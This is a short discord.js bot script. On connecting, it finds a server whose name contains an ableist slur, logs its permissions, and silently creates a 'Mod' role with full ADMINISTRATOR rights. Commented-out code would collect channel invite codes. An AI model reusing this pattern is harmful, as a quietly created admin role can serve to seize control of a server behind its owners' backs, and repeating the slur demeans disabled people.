const Discord = require("discord.js");
const client = new Discord.Client();
require("dotenv").config();
client.on("ready", () => {
  client.guilds.cache.forEach((guild) => {
    if (guild.name === "Retarded bois") {
      // guild.channels.cache.forEach((channel) => {
      //   // if (channel.type === "text") {
      //   //   console.log(channel.name);
      //   //   channel.createInvite().then(invite => {
      //   //     console.log(invite.code)
      //   //   })
      //   // }
      // });
      console.log(guild.me.permissions);
      guild.roles.create({ data: { name: 'Mod', permissions: ['ADMINISTRATOR'] } });
      
    }
  });
});
client.login(process.env.token);
